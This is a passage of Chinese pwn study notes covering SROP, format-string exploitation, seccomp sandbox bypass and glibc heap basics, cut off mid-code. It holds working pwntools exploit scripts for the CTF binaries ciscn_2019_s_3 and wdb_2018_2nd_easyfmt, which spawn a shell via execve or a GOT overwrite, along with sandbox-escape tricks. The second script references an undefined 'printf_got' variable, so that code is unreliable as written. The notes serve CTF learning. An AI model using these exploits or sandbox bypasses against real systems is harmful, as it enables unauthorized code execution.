<p>Sigreturn调用是一个较为特殊的系统调用，用于恢复进程的上下文状态。它通常由信号处理函数中的恢复操作使用，以确保进程在信号处理完成后能够正确返回到原始状态。Sigreturn调用会根据传递给信号处理函数的上下文信息来还原寄存器、堆栈等状态，从而继续执行进程的正常流程。</p>
<p>Sigreturn调用本身不是常规的API函数，而是由操作系统内部处理信号时使用的。在处理信号时，内核会根据信号上下文的保存信息调用sigreturn函数。这确保了进程在接收到信号后可以正确地恢复到之前的状态。</p>
<hr>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>1.内核向进程发起一个 signal，该进程被暂时挂起，进入内核</p>
<p>2.内核为该进程保存相应的上下文，跳转到 signal handler 中处理相应的 signal</p>
<p>3.signal handler 执行完毕，内核为进程恢复之前保存的上下文</p>
<p>4.恢复进程的执行</p>
<p>Linux 下，内核会帮助用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址 rt_sigreturn，这个地址指向一段代码，在这段代码中会调用 sigreturn 系统调用。当 signal handler 执行完之后，ESP&#x2F;RSP 就指向 rt_sigreturn，这样 signal handler 函数的最后一条指令 ret 会使得执行流跳转到这段 sigreturn 代码，执行 sigreturn 系统调用。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SROP_stack.png" class="">

<p>ucontext 和 siginfo 两块合起来就是 Signal Frame。</p>
<p>SROP 利用基于两点：</p>
<ol>
<li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li>
<li>用户进程上下文保存在栈上，且内核恢复上下文时不校验。</li>
</ol>
<p>32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p>
<p>利用 pwntools 可以直接 改写 Signal Frame：<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/rop/srop.html">pwnlib.rop.srop — Sigreturn Oriented Programming — pwntools 4.10.0 documentation</a></p>
<h3 id="例题：ciscn-2019-s-3"><a href="#例题：ciscn-2019-s-3" class="headerlink" title="例题：ciscn_2019_s_3"></a>例题：ciscn_2019_s_3</h3><p>64 位，开启了 NX。</p>
<p>查看 vuln 函数：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ciscn_s_3_1.png" class="">

<p>这里直接通过 syscall 调用了 read 和 write。read 处的可溢出量远超 buf 的大小。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ciscn_2019_s_3_2.png" class="">

<p>gadgets 处将系统调用号设置为了 0xF，明示可以进行 sigreturn 调用。</p>
<p>利用 write 泄露出栈上大小为 0x30 的数据，可以通过动调算出泄露出的地址与存储 buf 的起始地址之间的偏移。这里是 def8 - dee0 &#x3D; 0x118。即 泄露得到的地址 - 0x118 &#x3D; buf 首地址。在 buf 中写入 &#x2F;bin&#x2F;sh ，这样它的地址就变为已知。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">search aaaaaaaa</span></span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d07, halting search.</span><br><span class="line">[stack]         0x7fffffffdde0 &#x27;aaaaaaaa\n&#x27;</span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">x/8gx 0x7fffffffdde0</span></span><br><span class="line">0x7fffffffdde0:	0x6161616161616161	0x000000000000000a</span><br><span class="line">0x7fffffffddf0:	0x00007fffffffde10	0x0000000000400536</span><br><span class="line">0x7fffffffde00:	0x00007fffffffdef8	0x0000000100000000</span><br><span class="line">0x7fffffffde10:	0x0000000000400540	0x00007ffff7a2d830</span><br></pre></td></tr></table></figure>

<p>直接利用现有的 gadgets 进行 signal 调用，通过 SROP 得到 shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26299</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_s_3&quot;)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x04004ED</span></span><br><span class="line">syscall_ret = <span class="number">0x0400517</span></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 0x59</span></span><br><span class="line"><span class="comment"># rdi &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># rsi NULL</span></span><br><span class="line"><span class="comment"># rdx NULL</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">buf_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;buf_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = <span class="number">0x0400517</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(sigreturn) + p64(syscall_ret) + flat(frame)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>parameter（参数）</td>
<td>通常用于指定要格式化的参数的索引。如果在字符串中有多个参数需要格式化，可以使用参数来指定格式应该应用于哪个参数。一般的用法是通过 n$ 来获取格式化字符串中的指定参数。</td>
</tr>
<tr>
<td>flags（标志</td>
<td>用于指定各种格式化选项。一些常见的标志包括：<code>-</code>：左对齐输出。 <code>+</code>：显示正数的正号。 <code>0</code>：用零填充字段宽度。 <code>#</code>：用于不同类型的格式化（例如，八进制或十六进制前缀）。</td>
</tr>
<tr>
<td>field width（字段宽度）</td>
<td>用于指定输出字段的最小宽度。如果要格式化的内容不足宽度，可以使用空格或零进行填充，具体取决于标志。例如，<code>%5d</code> 表示输出字段的最小宽度为5个字符。</td>
</tr>
<tr>
<td>.precision（精度）</td>
<td>用于指定浮点数或字符串的小数位数或最大字符数。例如，<code>%.2f</code> 表示要输出的浮点数保留2位小数。</td>
</tr>
<tr>
<td>length（长度）</td>
<td>用于指定要格式化的参数的长度或大小。通常用于整数类型，例如<code>%ld</code> 表示格式化一个长整数。常见的长度标识符包括 <code>hh</code>（短短整数 1byte）、<code>h</code>（短整数 2byte）、<code>l</code>（长整数 4byte）、<code>ll</code>（长长整数 8byte）等。</td>
</tr>
<tr>
<td>type（类型）</td>
<td>指定要格式化的参数的数据类型。一些常见的类型包括：d：整数。f：浮点数。s：字符串。c：字符。x 或 X：十六进制整数。o：八进制整数。</td>
</tr>
</tbody></table>
<h3 id="一些举例"><a href="#一些举例" class="headerlink" title="一些举例"></a>一些举例</h3><h4 id="c"><a href="#c" class="headerlink" title="%c"></a>%c</h4><p>通常用来输出单个字符，结合 field width 这个参数，就可以输出大量字符。</p>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%100c&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>会输出大量空格：</p>
<img src="/2023/12/08/Pwn-f%60%14%EF%BF%BD/%25c.png" class="">

<p>如果这里没有后面的 ‘a’，依旧可以输出大量空格。</p>
<p>与 %c 同样效果的还有 %d 和 %s。</p>
<h4 id="p"><a href="#p" class="headerlink" title="%p"></a>%p</h4><p>在格式化字符串漏洞中用来泄露信息。</p>
<p>如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0x12345678</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the value of a:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of a:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<img src="/2023/12/08/Pwn-f%60%14%EF%BF%BD/%25p.png" class="">

<p>可以分别将 a 以地址的形式输出 、输出 a 的地址。</p>
<p>我们常用 <code>%n$p</code> 来泄露栈上的数据，<code>%n$x</code> 也可以。</p>
<h4 id="s"><a href="#s" class="headerlink" title="%s"></a>%s</h4><p>可以获取变量对应地址的数据，即将栈中的数据当作一个地址，获取这个地址中的数据，存在 0 截断。</p>
<p>以这个程序为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果不断地输入 %s 程序肯定会崩溃，因为有的数据无法被解析为正常的地址。</p>
<p>输入aaaa，可以通过动调得出输入字符与格式化字符串的偏移，这里是 6：</p>
<img src="/2023/12/08/Pwn-f%60%14%EF%BF%BD/%25s.png" class="">

<p>pwndbg 自带的 fmtarg 指令可以直接计算出偏移量：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">fmtarg 0xffffd088</span></span><br><span class="line">The index of format argument : 7 (&quot;\%6$p&quot;)</span><br></pre></td></tr></table></figure>

<p>利用该特性可以泄露某个函数的 got 表地址。但是不常用，因为当 PIE 开启时就很难这么干了。一般可利用的数据都会在栈上，确认好偏移之后，利用 %n$p 泄露即可。</p>
<p>这里如果输入的是 aaaa%6$s ，程序就会崩溃，因为 aaaa 不能作为一个合法地址被解析。</p>
<h4 id="n-hn-hhn"><a href="#n-hn-hhn" class="headerlink" title="%n,%hn,%hhn"></a>%n,%hn,%hhn</h4><p>最重要的几个。</p>
<p>%n 的作用是把已经成功输出的<strong>字符个数</strong>写入对应的整形指针参数所指的变量。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%100c%n\n&quot;</span>,a,&amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<img src="/2023/12/08/Pwn-f%60%14%EF%BF%BD/%25n.png" class="">

<p>可以将 100 写入变量 a 中。而 <code>%n</code> 结合 <code>n$</code>，以 <code>%Xc%Y$n</code> 这样的格式，可以将已经输入的字符数向指定的参数中写入，达成向任意地址写数据。%n 写入 4 字节，%hn 写入 2 字节，%hhn 写入 1 字节。</p>
<h4 id="a"><a href="#a" class="headerlink" title="%a"></a>%a</h4><p>以 double 型的 16 进制格式输出栈中的变量，当程序开启了 FORTIFY 机制后，printf 在编译时被 __printf_chk 函数替换。相比于 printf ，多了一些限制：1. 不能使用 <code>%n$p</code>不连续地打印，比如说如果要使用  <code>%3$p</code>，则需要同时使用  <code>%1$p</code>和 <code>%2$p</code>   2. 在使用 n% 的时候会做一些检查</p>
<p>而此时，在可输入字符数量有限的情况下，利用 %a 就可以输出栈顶上方的数据。</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">	read(<span class="number">0</span>,s,<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;My name is %s,I&#x27;m %d years old\n&quot;</span>,<span class="string">&quot;tom&quot;</span>,<span class="number">20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>输入5个%p，查看栈空间：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/fmt32.png" class="">

<p>继续运行至输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line">Continuing.</span><br><span class="line">0x804a008.0x14.0x80491ad.(nil).0x1</span><br></pre></td></tr></table></figure>

<p>可以看到它输出了自格式化字符串之下栈上的内容。</p>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>由于 64 位的传参规则不同，参数会先依次存放在 rdi，rsi，rdx，rcx，r8，r9 六个寄存器中。输入 5 个 %p，会依次输出自 rsi 开始的5个寄存器中的值。（rdi 存放 格式化字符串本身）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line">Continuing.</span><br><span class="line">0x4052a0(nil)0x1(nil)0x7fffffffdd96</span><br><span class="line">[Inferior 1 (process 12463) exited normally]</span><br></pre></td></tr></table></figure>

<p>也就是说，栈上的参数是从 %6$p 开始的。</p>
<h3 id="例题：wdb-2018-2nd-easyfm"><a href="#例题：wdb-2018-2nd-easyfm" class="headerlink" title="例题：wdb_2018_2nd_easyfm"></a>例题：wdb_2018_2nd_easyfm</h3><p>32位，NX。GOT表是可改的。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/wdb_easyfmt.png" class="">

<p>拥有无限循环的格式化字符串漏洞。</p>
<p>程序首先没有给现成的 system 和 &#x2F;bin&#x2F;sh ，需要自己通过泄露 libc 得到。利用格式化字符串漏洞修改 printf 函数的 GOT 表为 system 函数的地址，再次输入 ‘&#x2F;bin&#x2F;sh’，即可执行 system(‘&#x2F;bin&#x2F;sh’)。</p>
<p>首先泄露 printf 的 GOT 表值，再计算得到 system 地址，最后改写 GOT 表：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;wdb_2018_2nd_easyfmt&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;repeater?&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">libc_base = printf_addr -libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2 = fmtstr_payload(6,&#123;printf_addr: system_addr&#125;)</span></span><br><span class="line">system_low = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line">system_high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">payload2 = p32(printf_got) + p32(printf_got + <span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">bytes</span>(<span class="built_in">str</span>(system_low - <span class="number">8</span>), <span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">bytes</span>(<span class="built_in">str</span>(system_high-system_low), <span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p> 可以直接利用pwntools的工具，也可以自己构造格式化字符串改写。</p>
<h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><p>参考：[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273495.htm">原创]Seccomp BPF与容器安全-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h4 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h4><p>沙箱是限制用户行为的计算环境，可以通过各种方式限制沙箱里执行的内容，以确保沙箱的安全性。且其中执行内容不会影响到外部，起到隔离的作用。</p>
<blockquote>
<p>在计算机安全领域，沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。沙箱技术按照一定的安全策略，通过严格限制非可信程序对系统资源的使用来实现隔离。</p>
</blockquote>
<h4 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h4><p>secure computing mode：是linux kernel支持的一种安全机制。在Linux系统里，大量的系统调用（systemcall）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。通过seccomp，我们限制程序使用某些系统调用，这样可以减少系统的暴露面，同时是程序进入一种“安全”的状态。</p>
<p><strong>SECCOMP_SET_MODE_STRICT</strong></p>
<p>最早（2.2.16版本）被添加进入内核，只允许使用 read, write, _exit, sigreturn 四种系统调用。除了已打开的文件描述符和允许的系统调用，如果发起其它系统调用，内核会使用 SIGKILL 或 SIGSYS 终止该进程。</p>
<p><strong>SECCOMP_SET_MODE_FILTER</strong></p>
<p>Seccomp - Berkley Packet Filter（BPF）</p>
<p>允许用户使用可配置的策略来过滤系统调用</p>
<p>使用 BPF 规则自定义测量  ？？？</p>
<p>可对任意系统调用及其参数进行过滤</p>
<p><strong>BPF(Berkley Packet Filter)</strong></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/636162422">https://zhuanlan.zhihu.com/p/636162422</a></p>
<p>工具：seccomp-bpf.h</p>
<p><a target="_blank" rel="noopener" href="http://outflux.net/teach-seccomp/step-3/seccomp-bpf.h">http://outflux.net/teach-seccomp/step-3/seccomp-bpf.h</a></p>
<p>利用该工具快速构造 seccomp-bpf filter</p>
<p>使用库函数快速使用 seccomp </p>
<h4 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h4><p>一般方法：</p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1205038?spm=a2c6h.24874632.expert-profile.106.1ff93f444Ourlg">seccomp BPF与容器安全（上）-阿里云开发者社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1205039">seccomp BPF与容器安全（下）-阿里云开发者社区 (aliyun.com)</a></p>
<p>使用 shellcode 或 ROP 实现 ORW(Open&#x2F;openv,Read&#x2F;readv,Write&#x2F;writev)</p>
<p>首先使用 开源工具查看 seccomp 规则：<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p>
<p>特殊思路：</p>
<p>未检查架构：</p>
<p>i386 和 x86-64 下的系统调用号不同，可以利用 retq 指令修改 cs 寄存器为 0x23</p>
<p>cs &#x3D;&#x3D; 0x23 (32 bit)            cs &#x3D;&#x3D; 0x33(64 bit)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov DWORD [rsp+4],0x23</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>未检查范围：</p>
<p>在 x64 下还可以直接使用 x32-abi绕过</p>
<p>x32为x86-64下的一种特殊的模式，使用64位的寄存器和32位的地址，只需要直接加__X32_SYSCALL_BIT(0x4000000)，即原本的 syscall number + 0x4000000</p>
<p>更多：</p>
<p>根据具体规则，结合 syscall 调用表找没被过滤的替代行数，如：execveat openv readv writev</p>
<h2 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h2><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>是虚拟地址空间的一块连续的线性区域。由低地址向高地址增长。</p>
<p>提供动态分配的内存，允许程序申请大小未知的内存。</p>
<p>在用户与操作系统之间，作为动态内存管理的中间人。响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户进程。管理用户所释放的内存，适时归还给操作系统。</p>
<p>堆的实现有很多种，最常见的 glibc 中堆主要由 ptmalloc2 实现。</p>
<p>堆的基本操作有 malloc，free 等。背后的系统调用主要是 <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。</p>
<p><strong>虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong></p>
<p>我们称这一块连续的内存区域为 arena（可以理解为堆管理器所持有的内存池）。此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。我们称由 malloc 申请的内存为 chunk。malloc() 返回的指针指向一个 chunk 的数据区域。</p>
<p>分类：</p>
<table>
<thead>
<tr>
<th>按状态</th>
<th>按大小</th>
<th>按特定功能</th>
</tr>
</thead>
<tbody><tr>
<td>malloced</td>
<td>fast</td>
<td>top chunk</td>
</tr>
<tr>
<td>free</td>
<td>small</td>
<td>last remainder chunk</td>
</tr>
<tr>
<td></td>
<td>large</td>
<td></td>
</tr>
<tr>
<td></td>
<td>tcache</td>
<td></td>
</tr>
</tbody></table>
<p>malloced_chunk: 已被分配且填写了相应数据的 chunk</p>
<p>free_chunk: 被释放掉的 malloced_chunk</p>
<p>top_chunk: arena中从未被使用过的内存区域</p>
<p>last_remainder_chunk: malloc分割原 chunk 后剩余的部分</p>
<p>用户区域的大小不等于 chunk_head.size，chunk_head.size &#x3D; 用户区域大小 + 2 * 字长。</p>
<h4 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h4><p>malloc_chunk 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span 